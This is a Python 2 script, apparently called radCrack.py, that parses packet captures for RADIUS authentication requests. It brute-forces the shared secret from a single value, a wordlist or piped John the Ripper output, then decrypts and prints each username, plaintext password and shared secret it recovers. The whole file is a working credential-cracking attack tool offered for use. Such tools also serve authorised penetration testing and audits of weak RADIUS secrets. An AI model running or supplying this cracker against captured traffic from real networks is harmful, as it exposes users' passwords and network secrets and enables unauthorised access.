#!/usr/bin/env python

import sys
import hashlib
import dpkt
import socket

# Preforms one iteration of radius decryption
def rad_decrypt(sec,auth,crypt):
  m = hashlib.md5()
  m.update(sec+auth)
  m = m.digest()
  password = ""
  for i in range(len(crypt)):
    password += chr(ord(m[i])^ord(crypt[i]))
  return password  

# returns true if a string is readable ascii
def is_ascii(s):
  return all((ord(c) < 128 and ord(c) >31) or ord(c)==0 for c in s)


# Returns a list of radius packets, ip address pairs
def get_auth_packets(pcapFile):
  radPackets = []
  p = open(pcapFile, "rb")
  pcap = dpkt.pcap.Reader(p)
  for ts, buf in pcap:
    eth= dpkt.ethernet.Ethernet(buf)
    ip = eth.data
    udp = ip.data
    if type(udp)==dpkt.udp.UDP and udp.dport==1812:
      radPackets.append((udp.data,ip.dst))
  p.close()
  print "[*] Found "+str(len(radPackets))+" Radius Packets"
  return radPackets

# Grabs important information out of pcap
# gets all necessary info for cracking all auth packets and returns it in a dict
def get_good_stuff_from_pcap(pcapFile):
  goodstuff = {}
  for udpdata, ipdst in get_auth_packets(pcapFile):
    auth = udpdata[4:20]
    cur = 20
    curlen = ord(udpdata[cur+1:cur+2])
    username = "Not Found"
    while ord(udpdata[cur:cur+1])!=2:
      if ord(udpdata[cur:cur+1])==1:
        username = udpdata[cur+2:cur+curlen]
      cur += curlen
      curlen = ord(udpdata[cur+1:cur+2])
    crypt = udpdata[cur+2:cur+curlen]

    # Index each auth with md5 hash to avoid spending time on duplicates 
    m = hashlib.md5()
    m.update(str(ipdst)+str(username)+str(auth)+str(crypt))
    m = m.digest()

    goodstuff[m] = (ipdst, username, auth, crypt)
  return goodstuff


# Primary function that takes a pcap dictionary and list of secrets
# and cracks them
def crack_pcap(secretlist, pcapData):

  for curPacket in pcapData.items():
    crypt = curPacket[1][3]
    ipdst = curPacket[1][0]
    username = curPacket[1][1]
    auth = curPacket[1][2]

    all_passwords = {}
    for secret in secretlist:
      secret = secret.strip()
      curpass = auth
      password = ""
      i = 0
      while i < len(crypt):
        password += rad_decrypt(secret,curpass,crypt[i:i+16])
        curpass = crypt[i:i+16]
        i+=16
      if is_ascii(password):
        all_passwords[secret]=password
        print " "
        print "[*] Possible Radius Password Found"
        print "[*] Radius Server: "+socket.inet_ntoa(ipdst)
        print "[*] Username: "+username          
        print "[*] Password: "+password
        print "[*] Shared Secret: "+secret  

  return (username, all_passwords)

def usage():
  print "[*] USAGE:"
  print "./radCrack.py sharedsecret pcapfile"
  print " or "
  print "./radCrack.py -w secretlist pcapfile"
  print " or "
  print "john -incremental -stdout | ./radCrack.py -w - pcapfile"
  print " "
  exit(1)

#TODO getopts

if len(sys.argv)==4 and sys.argv[1] == "-w":
  keepGoing = True
  file = sys.argv[3]
  pcapData = get_good_stuff_from_pcap(file)
  print "\n[*] Cracking Radius Packets..."  

  while keepGoing:
    if sys.argv[2] == "-":
      secrets = [sys.stdin.readline()]
      if not secrets[0]:
        break
    else:
      keepGoing = False
      f = open(sys.argv[2])
      secrets = f.readlines()
      f.close()

    crack_pcap(secrets, pcapData)
elif len(sys.argv)==3:
  secret = sys.argv[1]
  file = sys.argv[2]

  pcapData = get_good_stuff_from_pcap(file)
  print "\n[*] Cracking Radius Packets..."  
  crack_pcap([secret], pcapData)
else:
  usage()
print "\n[*] DONE "
